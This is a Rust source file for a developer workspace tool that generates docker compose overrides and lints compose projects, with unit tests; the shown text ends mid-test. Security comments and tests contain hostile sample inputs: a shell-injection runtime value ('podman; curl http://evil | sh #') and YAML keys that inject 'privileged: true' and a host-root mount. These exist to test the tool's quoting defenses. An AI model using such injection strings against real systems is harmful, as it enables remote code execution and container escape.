//! Auto-derive a repo's `services` from its compose file. See `ARCHITECTURE.md`
//! for how this fits the `ws up` flow.
//!
//! Only container port 80/443 is classified HTTP; everything else is raw TCP.
//! Widen via the `.ws.json` override, not here — mis-marking a raw service HTTP
//! would have Caddy try to HTTP-proxy a non-HTTP protocol.

use anyhow::{Context, Result};
use serde::Deserialize;
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::caddy::WS_NET;
use crate::config::{HttpDecl, ServiceConfig, WsConfig};
use crate::remote::{self, Site};

/// In compose's own preference order — `base_files` takes the first present as
/// the primary.
const COMPOSE_FILES: &[&str] =
    &["compose.yaml", "compose.yml", "docker-compose.yaml", "docker-compose.yml"];

pub fn has_compose_file(dir: &Path) -> bool {
    COMPOSE_FILES.iter().any(|f| dir.join(f).is_file())
}

/// The base compose file(s) to lead the `COMPOSE_FILE` list with: once
/// `COMPOSE_FILE` is set compose stops auto-discovering, so they have to be
/// named explicitly for the merge to include them.
///
/// The `.override.` sibling is matched to the *primary's family* — compose only
/// merges the matching one, so pairing a `compose.yaml` with a
/// `docker-compose.override.yml` would apply an override the project never had.
pub fn base_files(worktree: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let Some(base) = COMPOSE_FILES.iter().find(|f| worktree.join(f).is_file()) else {
        return files;
    };
    files.push(worktree.join(base));
    let family = if base.starts_with("docker-compose") { "docker-compose" } else { "compose" };
    for ext in ["yaml", "yml"] {
        let sibling = format!("{family}.override.{ext}");
        if worktree.join(&sibling).is_file() {
            files.push(worktree.join(sibling));
            break;
        }
    }
    files
}

/// Compose rejects a `COMPOSE_PROJECT_NAME` outside `[a-z0-9][a-z0-9_-]*`, and
/// `sanitize_branch` only strips slashes — so an uppercase or dotted branch
/// (`Feat/JIRA-1.2`) would otherwise break `up` *and* `down`.
pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
    let mut s: String = format!("{branch_sanitized}-{repo}")
        .chars()
        .map(|c| match c {
            'a'..='z' | '0'..='9' | '_' | '-' => c,
            'A'..='Z' => c.to_ascii_lowercase(),
            _ => '-',
        })
        .collect();
    let start = s.find(|c: char| c.is_ascii_alphanumeric()).unwrap_or(s.len());
    s.drain(..start);
    if s.is_empty() { "ws".to_string() } else { s }
}

/// Returns `true` when a file was written, so the caller adds it to
/// `COMPOSE_FILE`.
pub fn write_override(
    site: &Site,
    path: &str,
    services: &BTreeMap<String, ServiceConfig>,
    all_services: &BTreeSet<String>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Result<bool> {
    match render_override(services, all_services, port_map, env, join_ws_net) {
        Some(content) => {
            site.write_file(path, &content)?;
            Ok(true)
        }
        None => {
            // Drop an override a prior `up` left, so a later read-only phase
            // can't reference a stale file.
            site.remove_file(path);
            Ok(false)
        }
    }
}

/// The base compose file(s) as paths *at the site*: which files exist is decided
/// from the local (synced) worktree, then each is re-homed under `site_worktree`.
fn base_files_at(worktree: &Path, site_worktree: &str) -> Vec<String> {
    let base = site_worktree.trim_end_matches('/');
    base_files(worktree)
        .iter()
        .filter_map(|p| p.file_name().map(|n| format!("{base}/{}", n.to_string_lossy())))
        .collect()
}

/// The generated compose override's path at the execution site — remotely, a
/// `.ws-meta` sibling of the server's synced worktrees, so it lives beside the
/// stack it overrides and is torn down with it.
pub(crate) fn override_path_at(
    cfg: &WsConfig,
    site: &Site,
    root: &Path,
    branch_sanitized: &str,
    repo: &str,
) -> String {
    match &cfg.remote {
        None => crate::ports::override_file(root, branch_sanitized, repo).to_string_lossy().into_owned(),
        // Home-resolved via the same owner as `Site::worktree_at`, so the
        // override can't land beside a different directory than the worktree it
        // overrides.
        Some(r) => format!(
            "{}/.ws-meta/{branch_sanitized}-{repo}.override.yml",
            site.root_at(Some(r), root).trim_end_matches('/')
        ),
    }
}

/// The `COMPOSE_*` env for a container repo, writing the override on an
/// activating phase.
///
/// `COMPOSE_PROJECT_NAME` is set on every phase: compose's default project name
/// is the worktree's dir basename, identical across branches, so distinct stacks
/// would collide on containers/networks/volumes. `COMPOSE_FILE` is set only on
/// the phase that (re)writes the override — `down`/`ps`/`exec` target the project
/// by name and don't need it, so they leave it unset rather than risk pointing at
/// an override an edited compose file left stale.
#[allow(clippy::too_many_arguments)]
pub fn env_for(
    cfg: &WsConfig,
    site: &Site,
    root: &Path,
    worktree: &Path,
    site_worktree: &str,
    branch_sanitized: &str,
    repo: &str,
    services: &BTreeMap<String, ServiceConfig>,
    all_services: &BTreeSet<String>,
    port_map: &BTreeMap<String, u16>,
    declared: &[(String, String)],
    activating: bool,
) -> Result<Vec<(String, String)>> {
    let base = base_files_at(worktree, site_worktree);
    if base.is_empty() {
        return Ok(Vec::new());
    }

    let project = project_name(branch_sanitized, repo);
    // Only join `ws-net` when routing is active: otherwise referencing the
    // external network would just make `compose up` fail for nothing.
    let join_ws_net = cfg.routing_active();
    let override_path = override_path_at(cfg, site, root, branch_sanitized, repo);
    let mut env = vec![("COMPOSE_PROJECT_NAME".to_string(), project)];
    if activating
        && write_override(site, &override_path, services, all_services, port_map, declared, join_ws_net)?
    {
        let mut files: Vec<String> = base;
        files.push(override_path);
        env.push(("COMPOSE_FILE".to_string(), files.join(":")));
    }
    Ok(env)
}

#[derive(Default)]
struct ServicePlan {
    is_http: bool,
    /// `(host, internal)` pairs.
    reissue: Vec<(u16, u16)>,
}

/// Declared `env` is materialized as `environment:` because a shell env doesn't
/// cross into a container.
///
/// `join_ws_net` means routing is active (`domain` is set): HTTP services join
/// the shared `ws-net` so the containerized Caddy can dial them, and give up
/// their host publish. Without it, HTTP services keep publishing — nothing
/// routes them, so dropping the publish would only strand them.
fn render_override(
    services: &BTreeMap<String, ServiceConfig>,
    all_services: &BTreeSet<String>,
    port_map: &BTreeMap<String, u16>,
    env: &[(String, String)],
    join_ws_net: bool,
) -> Option<String> {
    // A `ports:` directive replaces the whole list, so the several `<svc>_<port>`
    // keys a multi-port service derives as must be planned as one block.
    let mut plans: BTreeMap<String, ServicePlan> = BTreeMap::new();
    for (key, svc) in services {
        let plan = plans.entry(compose_service(key, svc.port).to_string()).or_default();
        if svc.is_http() {
            plan.is_http = true;
        } else if let Some(&host) = port_map.get(key) {
            plan.reissue.push((host, svc.port));
        }
    }

    // A service absent from the `ports` map keeps its committed `ports:`
    // untouched. A present, empty list drops the publish entirely (a routed HTTP
    // service reaches Caddy over `ws-net` and needs no host port).
    let mut ports: BTreeMap<String, Vec<(u16, u16)>> = BTreeMap::new();
    let mut join: BTreeSet<String> = BTreeSet::new();
    for (name, plan) in &plans {
        if plan.is_http && join_ws_net {
            join.insert(name.clone());
            ports.insert(name.clone(), plan.reissue.clone());
        } else if plan.is_http {
            // Deliberately empty: with no Caddy to route them, HTTP (and mixed
            // HTTP+raw) services must keep publishing or they're unreachable.
        } else if !plan.reissue.is_empty() {
            ports.insert(name.clone(), plan.reissue.clone());
        }
    }

    if ports.is_empty() && env.is_empty() {
        return None;
    }

    // Env goes to `all_services`, not just `plans`: plans only holds services a
    // port was derived for, and the container the app actually runs in is often
    // portless (php-fpm behind nginx).
    let mut names: BTreeSet<String> = ports.keys().cloned().collect();
    if !env.is_empty() {
        names.extend(plans.keys().cloned());
        names.extend(all_services.iter().cloned());
    }

    let mut out = String::from("# Generated by ws — do not edit. Regenerated on `ws up`.\nservices:\n");
    for name in &names {
        out.push_str(&format!("  {}:\n", yaml_key(name)));
        match ports.get(name) {
            Some(list) if list.is_empty() => out.push_str("    ports: !override []\n"),
            Some(list) => {
                out.push_str("    ports: !override\n");
                for (host, internal) in list {
                    out.push_str(&format!("      - \"{host}:{internal}\"\n"));
                }
            }
            None => {}
        }
        if join.contains(name) {
            out.push_str(&format!("    networks:\n      - default\n      - {WS_NET}\n"));
        }
        if !env.is_empty() {
            out.push_str("    environment:\n");
            for (k, v) in env {
                out.push_str(&format!(
                    "      {}: {}\n",
                    yaml_key(k),
                    yaml_dquote(&compose_escape(v))
                ));
            }
        }
    }
    if !join.is_empty() {
        out.push_str(&format!("networks:\n  {WS_NET}:\n    external: true\n"));
    }
    Some(out)
}

/// Recover the real compose service name from a derived key. A service literally
/// named `<x>_<port>` publishing that port collides here — the same accepted
/// ambiguity `derive_service` creates.
pub(crate) fn compose_service(key: &str, internal_port: u16) -> &str {
    key.strip_suffix(&format!("_{internal_port}")).unwrap_or(key)
}

/// Compose interpolates variables *after* YAML parsing, so a residual `$` — an
/// unresolved cross-repo token, or a literal `$` in a declared value — aborts
/// the whole `up` unless doubled.
fn compose_escape(v: &str) -> String {
    v.replace('$', "$$")
}

/// Security invariant. Both key kinds we emit — declared `env` names and compose
/// service names — come from `.ws.json`, which is not gitignored and so arrives
/// with a clone, and a JSON string can carry a newline. Written raw, such a key
/// closes the `environment:` map and dedents back to service level, granting
/// every service in the stack directives (`privileged: true`, a host-root bind
/// mount) the committed compose file never contained. Quoting keeps it one
/// scalar. The plain set is deliberately narrow but covers every legal env var
/// and compose service name, so ordinary config still renders bare.
fn yaml_key(k: &str) -> String {
    let mut chars = k.chars();
    let plain = chars.next().is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    if plain { k.to_string() } else { yaml_dquote(k) }
}

/// `yaml_key` routes hostile keys through here, so every character that could
/// re-open the document has to leave as an escape rather than a raw byte. That
/// includes U+0085/2028/2029, which YAML 1.1 parsers treat as line breaks.
fn yaml_dquote(v: &str) -> String {
    let mut out = String::with_capacity(v.len() + 2);
    out.push('"');
    for c in v.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() || matches!(c, '\u{2028}' | '\u{2029}') => {
                if (c as u32) < 0x100 {
                    out.push_str(&format!("\\x{:02x}", c as u32));
                } else {
                    out.push_str(&format!("\\u{:04x}", c as u32));
                }
            }
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// `worktree` is the path *at the site* — the local worktree, or the
/// server-side synced dir.
pub fn derive(site: &Site, runtime: &str, worktree: &str) -> Result<Derived> {
    parse(&compose_config_json(site, runtime, worktree, false)?)
}

/// `names` is wider than `services`: a portless service (a php-fpm `app` behind
/// an nginx `web`) gets no `ServiceConfig`, yet is usually exactly where the
/// application code runs, so declared `env` must still reach it.
pub struct Derived {
    pub services: BTreeMap<String, ServiceConfig>,
    pub names: BTreeSet<String>,
}

/// `clean_env` strips `ws`'s own injected `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE`
/// so the output reflects the *committed* project — the linter needs that, the
/// derive path wants the ambient env. Remotely it's moot: the server shell never
/// has those vars.
fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bool) -> Result<String> {
    let out = match site {
        Site::Local => {
            let mut cmd = Command::new(runtime);
            cmd.args(["compose", "config", "--format", "json"]).current_dir(worktree);
            if clean_env {
                cmd.env_remove("COMPOSE_PROJECT_NAME").env_remove("COMPOSE_FILE");
            }
            cmd.output()
                .with_context(|| format!("spawn `{runtime} compose config`"))?
        }
        Site::Remote { .. } => site
            .shell(&remote_compose_script(worktree, runtime))
            .output()
            .with_context(|| format!("ssh `{runtime} compose config`"))?,
    };
    if !out.status.success() {
        anyhow::bail!(
            "`{runtime} compose config` failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// Security invariant: this runs in the server's shell, and `runtime` is a
/// `.ws.json` field that arrives with a clone (`podman; curl evil | sh #`).
/// Quoting keeps parity with the local `Command::new(runtime)` — a bad value
/// fails as "command not found" instead of injecting.
fn remote_compose_script(worktree: &str, runtime: &str) -> String {
    format!(
        "cd {} && {} compose config --format json",
        remote::shell_quote(worktree),
        remote::shell_quote(runtime)
    )
}

#[derive(Deserialize)]
struct ComposeConfig {
    #[serde(default)]
    services: BTreeMap<String, ComposeService>,
}

#[derive(Deserialize)]
struct ComposeService {
    #[serde(default)]
    ports: Vec<ComposePort>,
}

#[derive(Deserialize)]
struct ComposePort {
    target: u16,
    #[serde(default)]
    protocol: Option<String>,
}

fn parse(json: &str) -> Result<Derived> {
    let cfg: ComposeConfig = serde_json::from_str(json).context("parse compose config JSON")?;
    let mut services = BTreeMap::new();
    for (name, svc) in &cfg.services {
        derive_service(name, svc, &mut services);
    }
    Ok(Derived { services, names: cfg.services.keys().cloned().collect() })
}

fn derive_service(name: &str, svc: &ComposeService, out: &mut BTreeMap<String, ServiceConfig>) {
    // UDP and anything without a numeric target is deliberately ignored.
    let ports: BTreeSet<u16> = svc
        .ports
        .iter()
        .filter(|p| p.protocol.as_deref().unwrap_or("tcp") == "tcp")
        .map(|p| p.target)
        .collect();
    let (http, tcp): (Vec<u16>, Vec<u16>) =
        ports.into_iter().partition(|p| *p == 80 || *p == 443);

    // Prefer plain 80: Caddy fronts TLS and proxies to it.
    if !http.is_empty() {
        let dial = if http.contains(&80) { 80 } else { 443 };
        out.insert(
            name.to_string(),
            ServiceConfig { http: Some(HttpDecl::Subdomain(name.to_string())), port: dial, shared: false, wildcard: false },
        );
    }
    // Suffixing is by underscore so the `WS_PORT_*` env name stays shell-clean.
    let single = http.is_empty() && tcp.len() == 1;
    for p in tcp {
        let key = if single { name.to_string() } else { format!("{name}_{p}") };
        out.insert(key, ServiceConfig { http: None, port: p, shared: false, wildcard: false });
    }
}

/// Map values are `Option` so a stray `null` entry can't fail the whole parse
/// and silently drop real findings.
#[derive(Deserialize)]
struct LintDoc {
    #[serde(default)]
    services: BTreeMap<String, Option<LintService>>,
    #[serde(default)]
    volumes: BTreeMap<String, Option<LintVolume>>,
}

#[derive(Deserialize)]
struct LintService {
    #[serde(default)]
    container_name: Option<String>,
}

#[derive(Deserialize)]
struct LintVolume {
    /// Normalizes to a bool in compose config output; the older `{name: …}`
    /// object form is tolerated too.
    #[serde(default)]
    external: Option<serde_json::Value>,
}

/// Advisory and best-effort: warn loudly, never block. A missing runtime or
/// unparseable output yields no findings rather than an error. It is a host-side
/// static check over the committed files, so it always runs locally even for a
/// remote stack.
pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
    if !has_compose_file(worktree) {
        return Vec::new();
    }
    let Ok(json) = compose_config_json(&Site::Local, runtime, &worktree.to_string_lossy(), true)
    else {
        return Vec::new();
    };
    match serde_json::from_str::<LintDoc>(&json) {
        Ok(doc) => lint_findings(&doc),
        Err(_) => Vec::new(),
    }
}

/// Only these two constructs are flagged, because they are the only isolation
/// opt-outs `compose config` reports unambiguously. Notably absent: the project
/// `name` and named-volume `name`, which compose resolves and emits for *every*
/// project (a plain `data: {}` becomes `<project>_data`), so a committed pin is
/// indistinguishable from a clean one and checking them would warn on everything.
fn lint_findings(doc: &LintDoc) -> Vec<String> {
    let mut out = Vec::new();

    // Compose emits `container_name` only when it was committed.
    for (svc, s) in &doc.services {
        if let Some(cn) = s.as_ref().and_then(|s| s.container_name.as_deref()) {
            out.push(format!(
                "service `{svc}` sets `container_name: {cn}` — breaks per-worktree \
                 namespacing; parallel worktrees collide on the name (remove it)"
            ));
        }
    }

    // Likewise `external` — emitted only when committed.
    for (vol, v) in &doc.volumes {
        if v.as_ref().is_some_and(|v| is_truthy(v.external.as_ref())) {
            out.push(format!(
                "volume `{vol}` is `external` — shared across worktrees, so one \
                 branch's writes/migrations corrupt another's (can't auto-fix)"
            ));
        }
    }

    out
}

fn is_truthy(v: Option<&serde_json::Value>) -> bool {
    match v {
        Some(serde_json::Value::Bool(b)) => *b,
        Some(serde_json::Value::Object(o)) => !o.is_empty(),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::RemoteConfig;

    const SAMPLE: &str = r#"{
      "name": "proj",
      "services": {
        "web":     { "ports": [ {"target": 443, "protocol": "tcp"}, {"target": 80, "protocol": "tcp"} ] },
        "app":     { "expose": ["9000"] },
        "db":      { "ports": [ {"target": 3306, "protocol": "tcp"} ] },
        "mailpit": { "ports": [ {"target": 1025, "protocol": "tcp"}, {"target": 8025, "protocol": "tcp"} ] },
        "redis":   { "ports": [ {"target": 6379, "published": "6379", "protocol": "tcp"} ] }
      }
    }"#;

    #[test]
    fn override_path_at_is_absolute_for_a_relative_remote_base() {
        // A home-relative `workspace_path` must still yield an absolute server
        // override path, else `COMPOSE_FILE` double-resolves under the `cd`'d
        // worktree and the remote `up` fails.
        let cfg = WsConfig {
            remote: Some(RemoteConfig::new("srv".into(), Some("myapp".into()))),
            ..Default::default()
        };
        let site = Site::Remote { connection: "srv".into(), home: "/home/u".into() };
        let p = override_path_at(&cfg, &site, Path::new("/local/myapp"), "feat-x", "api");
        assert_eq!(p, "/home/u/myapp/.ws-meta/feat-x-api.override.yml");

        let local = WsConfig::default();
        let lp = override_path_at(&local, &Site::Local, Path::new("/ws"), "feat-x", "api");
        assert!(lp.ends_with(".ws-meta/feat-x-api.override.yml"), "{lp}");
    }

    #[test]
    fn derives_http_tcp_and_multiport() {
        let s = parse(SAMPLE).unwrap().services;

        let web = &s["web"];
        assert!(matches!(web.http, Some(HttpDecl::Subdomain(ref d)) if d == "web"));
        assert_eq!(web.port, 80);

        assert!(s["db"].http.is_none() && s["db"].port == 3306);
        assert!(s["redis"].http.is_none() && s["redis"].port == 6379);

        assert_eq!(s["mailpit_1025"].port, 1025);
        assert_eq!(s["mailpit_8025"].port, 8025);
        assert!(s["mailpit_1025"].http.is_none());
        assert!(!s.contains_key("mailpit"), "multi-port must not keep the bare name");

        // `app` is expose-only — publishes nothing, so nothing is derived.
        assert!(!s.contains_key("app"));
    }

    #[test]
    fn remote_compose_script_quotes_a_hostile_runtime() {
        // A `runtime` carried in a cloned repo must not inject into the
        // server-side shell.
        let s = remote_compose_script("/srv/ws/feat/api", "podman; curl http://evil | sh #");
        assert!(s.contains("'podman; curl http://evil | sh #'"), "runtime not quoted: {s}");
        assert!(s.starts_with("cd /srv/ws/feat/api && "), "{s}");
        assert_eq!(
            remote_compose_script("/w", "podman"),
            "cd /w && podman compose config --format json"
        );
    }

    #[test]
    fn service_with_only_443_routes_http() {
        let json = r#"{"services":{"web":{"ports":[{"target":443,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap().services;
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web"].port, 443);
    }

    #[test]
    fn http_service_with_extra_tcp_port_splits() {
        let json = r#"{"services":{"web":{"ports":[
            {"target":80,"protocol":"tcp"},{"target":9000,"protocol":"tcp"}]}}}"#;
        let s = parse(json).unwrap().services;
        assert_eq!(s["web"].port, 80);
        assert!(matches!(s["web"].http, Some(HttpDecl::Subdomain(_))));
        assert_eq!(s["web_9000"].port, 9000);
        assert!(s["web_9000"].http.is_none());
    }

    #[test]
    fn udp_ports_are_ignored() {
        let json = r#"{"services":{"dns":{"ports":[{"target":53,"protocol":"udp"}]}}}"#;
        assert!(parse(json).unwrap().services.is_empty());
    }

    #[test]
    fn empty_services_parse_to_empty() {
        assert!(parse(r#"{"name":"x"}"#).unwrap().services.is_empty());
    }

    fn svc(http: Option<HttpDecl>, port: u16) -> ServiceConfig {
        ServiceConfig { http, port, shared: false, wildcard: false }
    }

    fn map(entries: &[(&str, ServiceConfig)]) -> BTreeMap<String, ServiceConfig> {
        entries.iter().map(|(n, s)| ((*n).into(), s.clone())).collect()
    }

    /// Stands in for what `derive` would return alongside a declared set; only
    /// valid for tests that don't exercise portless services.
    fn names(services: &BTreeMap<String, ServiceConfig>) -> BTreeSet<String> {
        services.iter().map(|(k, s)| compose_service(k, s.port).to_string()).collect()
    }

    #[test]
    fn declared_env_reaches_a_portless_service() {
        // A portless `app` never enters the derived `services` map, but it is
        // where the code runs — without env there, `artisan` reads a stale `.env`.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let all: BTreeSet<String> =
            ["app", "web", "db"].iter().map(|s| s.to_string()).collect();
        let env = [("SSO".to_string(), "host:20001".to_string())];
        let out = render_override(&services, &all, &BTreeMap::new(), &env, true)
            .expect("some override");

        assert!(out.contains("  app:\n    environment:\n      SSO:"), "portless svc missing env: {out}");
        assert!(out.contains("  db:\n    environment:\n      SSO:"), "db missing env: {out}");
        assert!(out.contains("SSO: \"host:20001\""), "{out}");
    }

    #[test]
    fn override_reissues_raw_tcp_ports_and_leaves_http_alone() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let out = render_override(&services, &names(&services), &ports, &[], false).expect("some override");

        assert!(out.contains("  db:\n    ports: !override\n      - \"20001:3306\""), "{out}");
        assert!(!out.contains("web:"), "HTTP service must not appear in the override: {out}");
    }

    #[test]
    fn override_groups_multiport_service_under_one_entry() {
        let services = map(&[
            ("mailpit_1025", svc(None, 1025)),
            ("mailpit_8025", svc(None, 8025)),
        ]);
        let ports =
            [("mailpit_1025".to_string(), 20002u16), ("mailpit_8025".to_string(), 20003u16)]
                .into_iter()
                .collect();
        let out = render_override(&services, &names(&services), &ports, &[], false).expect("some override");

        assert_eq!(out.matches("mailpit:").count(), 1, "one grouped entry: {out}");
        assert!(out.contains("      - \"20002:1025\""), "{out}");
        assert!(out.contains("      - \"20003:8025\""), "{out}");
    }

    #[test]
    fn override_materializes_declared_env_on_every_service() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();
        let env = [("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string())];
        let out = render_override(&services, &names(&services), &ports, &env, false).expect("some override");

        // Repo-level `env` goes to the whole stack, not just the ported services.
        assert_eq!(out.matches("APP_URL:").count(), 2, "{out}");
        assert!(out.contains("APP_URL: \"https://feat-x.web.myapp.test\""), "{out}");
    }

    #[test]
    fn override_escapes_dollars_so_compose_wont_interpolate_an_unresolved_token() {
        // Written raw, compose interpolates the unresolved token and aborts the
        // whole `up`; escaped, it passes through untouched.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let env = [("SSO".to_string(), "host:${WS_PORT_app.web}/login".to_string())];
        let out = render_override(&services, &names(&services), &BTreeMap::new(), &env, false)
            .expect("some override");
        assert!(out.contains(r#"SSO: "host:$${WS_PORT_app.web}/login""#), "{out}");
        assert!(!out.contains(r#"SSO: "host:${WS_PORT_app.web}"#), "raw token must not survive: {out}");
    }

    #[test]
    fn override_quotes_a_hostile_env_key_so_it_cant_inject_service_directives() {
        // Unquoted, this key closes the `environment:` map and dedents back to
        // service level, handing every service `privileged: true` plus the host
        // root. Quoted, it's one inert scalar.
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        let hostile =
            "X: \"1\"\n    privileged: true\n    volumes:\n      - \"/:/host\"\n    labels";
        let env = [(hostile.to_string(), "pwn".to_string())];
        let out = render_override(&services, &names(&services), &BTreeMap::new(), &env, false)
            .expect("some override");

        assert!(
            out.contains(
                r#"      "X: \"1\"\n    privileged: true\n    volumes:\n      - \"/:/host\"\n    labels": "pwn""#
            ),
            "hostile key must render as one escaped scalar:\n{out}"
        );
        assert!(!out.contains("\n    privileged: true"), "directive injected:\n{out}");
        assert!(!out.contains("\n    volumes:"), "directive injected:\n{out}");
        // Comment, `services:`, `  web:`, `    environment:`, the one env line.
        assert_eq!(out.lines().count(), 5, "hostile key added lines:\n{out}");
    }

    #[test]
    fn override_quotes_a_hostile_service_name() {
        // Same shape one level up: a `.ws.json` `services` key is emitted as a
        // YAML key too, so a newline in it injects a whole extra service block.
        let hostile = "web:\n    privileged: true\n  evil";
        let services = map(&[(hostile, svc(None, 3306))]);
        let ports = [(hostile.to_string(), 20001u16)].into_iter().collect();
        let out = render_override(&services, &names(&services), &ports, &[], false)
            .expect("some override");

        assert!(
            out.contains(r#"  "web:\n    privileged: true\n  evil":"#),
            "hostile service name must be quoted:\n{out}"
        );
        assert!(!out.contains("\n    privileged: true"), "directive injected:\n{out}");
        // Comment, `services:`, the one service key, `ports: !override`, one port.
        assert_eq!(out.lines().count(), 5, "hostile name added lines:\n{out}");
    }

    #[test]
    fn ordinary_service_names_and_env_keys_stay_bare_keys() {
        // The key guard must stay invisible to real config — compose service
        // names legally carry `-` and `.`.
        let services = map(&[("api-gateway", svc(None, 8080)), ("mail.relay", svc(None, 1025))]);
        let ports = [("api-gateway".to_string(), 20010u16), ("mail.relay".to_string(), 20011u16)]
            .into_iter()
            .collect();
        let env = [
            ("APP_URL".to_string(), "https://feat-x.web.myapp.test".to_string()),
            ("DB_PORT_2".to_string(), "3306".to_string()),
            ("_LEADING_UNDERSCORE".to_string(), "ok".to_string()),
        ];
        let out = render_override(&services, &names(&services), &ports, &env, false)
            .expect("some override");

        assert!(out.contains("  api-gateway:\n    ports: !override\n"), "{out}");
        assert!(out.contains("  mail.relay:\n    ports: !override\n"), "{out}");
        assert!(out.contains("      APP_URL: \"https://feat-x.web.myapp.test\"\n"), "{out}");
        assert!(out.contains("      DB_PORT_2: \"3306\"\n"), "{out}");
        assert!(out.contains("      _LEADING_UNDERSCORE: \"ok\"\n"), "{out}");
    }

    #[test]
    fn yaml_dquote_escapes_exotic_line_breaks() {
        // U+0085 / U+2028 are line breaks to a YAML 1.1 parser; raw, they'd end
        // the scalar's line from inside the quotes.
        assert_eq!(yaml_dquote("a\u{85}b\u{2028}c\u{b}d"), r#""a\x85b\u2028c\x0bd""#);
    }

    #[test]
    fn override_is_none_when_nothing_to_reissue() {
        let services = map(&[("web", svc(Some(HttpDecl::Subdomain("web".into())), 80))]);
        assert!(render_override(&services, &names(&services), &BTreeMap::new(), &[], false).is_none());
    }

    #[test]
    fn join_ws_net_drops_http_publish_and_declares_external_network() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("db", svc(None, 3306)),
        ]);
        let ports = [("db".to_string(), 20001u16)].into_iter().collect();

        // Join off: HTTP web keeps its host publish, since no Caddy routes it.
        let off = render_override(&services, &names(&services), &ports, &[], false).unwrap();
        assert!(!off.contains("ws-net"), "join off must not touch ws-net:\n{off}");
        assert!(!off.contains("web:"), "HTTP web untouched when routing off:\n{off}");

        let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !override []\n    networks:\n      - default\n      - ws-net\n"),
            "web must reset its publish and join ws-net:\n{on}"
        );
        assert!(on.contains("  db:\n    ports: !override\n"), "db still reissued:\n{on}");
        assert!(on.contains("networks:\n  ws-net:\n    external: true\n"), "external net decl:\n{on}");
    }

    #[test]
    fn mixed_http_and_raw_service_keeps_only_the_raw_port_when_routing() {
        let services = map(&[
            ("web", svc(Some(HttpDecl::Subdomain("web".into())), 80)),
            ("web_9000", svc(None, 9000)),
        ]);
        let ports = [("web_9000".to_string(), 20005u16)].into_iter().collect();

        // Routing off: the whole service is left alone — dropping the 80 publish
        // would strand it, so the 9000 reissue is given up too.
        assert!(render_override(&services, &names(&services), &ports, &[], false).is_none());

        let on = render_override(&services, &names(&services), &ports, &[], true).unwrap();
        assert!(
            on.contains("  web:\n    ports: !override\n      - \"20005:9000\"\n    networks:"),
            "mixed service keeps only its raw port + joins ws-net:\n{on}"
        );
        assert!(
            on.contains("  web:\n    ports: !override\n      - \"20005:9000\""),
            "a mixed service must keep its raw port:\n{on}"
        );
    }

    #[test]
    fn compose_service_keeps_a_legit_underscored_single_port_name() {
        assert_eq!(compose_service("my_db", 3306), "my_db");
        assert_eq!(compose_service("mailpit_8025", 8025), "mailpit");
    }

    #[test]
    fn project_name_is_compose_legal() {
        assert_eq!(project_name("feat-foo", "api"), "feat-foo-api");
        assert_eq!(project_name("Feat-JIRA-1.2", "api"), "feat-jira-1-2-api");
        assert_eq!(project_name("-x", "api"), "x-api");
    }

    #[test]
    fn base_files_ignores_a_mismatched_family_override() {
        // Compose's own discovery would never merge this pair.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("compose.yaml"), "services: {}\n").unwrap();
        std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
        let files = base_files(dir.path());
        assert_eq!(files.len(), 1, "only the primary, no cross-family override: {files:?}");
        assert!(files[0].ends_with("compose.yaml"));
    }

    fn lint_json(json: &str) -> Vec<String> {
        let doc: LintDoc = serde_json::from_str(json).unwrap();
        lint_findings(&doc)
    }

    #[test]
    fn lint_flags_container_name_and_external_volume() {
        let json = r#"{
            "name": "myapp",
            "services": { "db": { "container_name": "myapp_db" }, "web": {} },
            "volumes": { "data": { "external": true }, "cache": { "name": "shared_cache" } }
        }"#;
        let findings = lint_json(json);
        // The pinned project `name` and the resolved volume `name` are not
        // flagged — see `lint_findings`.
        assert_eq!(findings.len(), 2, "only the two reliable opt-outs: {findings:?}");
        assert!(findings.iter().any(|f| f.contains("container_name: myapp_db")), "{findings:?}");
        assert!(findings.iter().any(|f| f.contains("volume `data` is `external`")), "{findings:?}");
    }

    #[test]
    fn lint_is_quiet_on_a_clean_project_with_resolved_names() {
        // The real `compose config` shape: both `name` fields are always emitted,
        // even for a plain `data: {}`, so neither implies a committed pin.
        let json = r#"{
            "name": "api",
            "services": { "web": { "ports": [ {"target": 80} ] }, "db": {} },
            "volumes": { "data": { "name": "api_data" } }
        }"#;
        assert!(lint_json(json).is_empty(), "resolved names must not warn: {:?}", lint_json(json));
    }

    #[test]
    fn lint_survives_a_null_map_value() {
        let json = r#"{"services":{"db":null,"x":{"container_name":"fixed"}},"volumes":{"v":null}}"#;
